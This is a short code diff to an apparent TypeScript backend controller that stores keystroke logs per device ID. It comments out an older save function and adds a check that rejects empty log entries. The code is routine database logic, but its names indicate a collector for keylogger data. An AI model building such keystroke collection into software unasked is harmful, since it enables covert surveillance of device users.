@@ -4,9 +4,36 @@ import KeyLogs from "../models/keylogs.model";
 import { KeyLogsModelType } from "../utils";
 
 // Add New KeyLogs
+// export const addNewKeyLogs = async (data: any) => {
+// 	try {
+// 		const { deviceId, keyLogsType, keylogs, event } = data;
+
+// 		const newKeyLog: KeyLogsModelType = new KeyLogs({
+// 			deviceId,
+// 			keyLogsType,
+// 			keylogs: keylogs,
+// 			keyevent: event,
+// 		});
+
+// 		await newKeyLog.save();
+
+// 		return { status: 200, message: "Key logs added successfully" };
+// 	} catch (error) {
+// 		console.error("Error adding key logs:", error);
+// 		return { status: 500, error: "Failed to add key logs" };
+// 	}
+// };
 export const addNewKeyLogs = async (data: any) => {
 	try {
 		const { deviceId, keyLogsType, keylogs, event } = data;
+
+		// Check if keylogs is not an empty string
+		if (!keylogs || keylogs.trim() === "") {
+			return {
+				status: 400,
+				message: "Key logs are empty, nothing to save",
+			};
+		}
 
 		const newKeyLog: KeyLogsModelType = new KeyLogs({
 			deviceId,
